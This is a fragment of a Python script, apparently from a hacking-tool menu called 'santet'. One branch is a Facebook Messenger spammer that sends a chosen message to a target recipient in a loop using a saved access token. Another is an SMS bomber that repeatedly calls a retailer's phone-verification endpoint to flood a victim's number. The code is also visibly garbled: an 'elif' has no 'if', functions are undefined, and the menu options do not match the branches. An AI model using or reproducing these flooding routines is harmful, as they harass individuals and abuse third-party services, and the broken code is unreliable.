import telethon
import os, sys, time, socket, random, requests
from telethon import TelegramClient, sync, utils





clearscreen()
print(__banner__)
print("""
Select from the menu:
  01) Lanjut
  02) Exit
""")

elif santet == "01" or santet == "1":
			print(facebookspam_banner)
			if os.path.isfile("token.log"):
				access_token = open("token.log","r").read()
			else:
				access_token = str(input("santet > set ACCESS_TOKEN "))
				open("token.log","w").write(access_token)
			recipient_id = str(input("santet > set RECIPIENT_ID "))
			try: count = int(input("santet > set COUNT "))
			except(ValueError): count = 100
			message = str(input("santet > set MESSAGE "))
			headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414","Content-Type": "application/json"}
			data = {"recipient": {"id": recipient_id},"message": {"text": message}}
			for x in range(count):
				r = requests.post("https://graph.facebook.com/v6.0/me/messages?access_token={}".format(access_token), params=data, headers=headers)
				if r.status_code == 200:
					sys.stdout.write(u"\u001b[1000D[*] Sent {} messages to {}...".format(x+1, recipient_id))
				else:
					sys.stdout.write(u"\u001b[1000D[!] Failed to send messages...")
				sys.stdout.flush()
			print("\n[!] Done ... !!\n")
			backtomenu_option()
		elif santet == "03" or santet == "3":
			print(smsbomber_banner)
			phone_number = input("PHONE_NUMBER: ")
			countx = input("COUNT: ")
			countx = int(countx)
			param = {'phone':''+phone_number,'smsType':'1'}
			count = 0
			while (count < countx):
				r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
				if '"success":true' in r.text:
					print("\n\033[1;32m[  OK  ] Send Succesful...Sleep for 1 second...\033[0m")
				else:
					print("\n\033[1;31m[FAILED] Send Failed...Sleep for 1 second...\033[0m")
				time.sleep(1)
				count = count + 1
			print("\033[1;33m[ DONE ] Stopped...\033[0m")
			backtomenu_option()
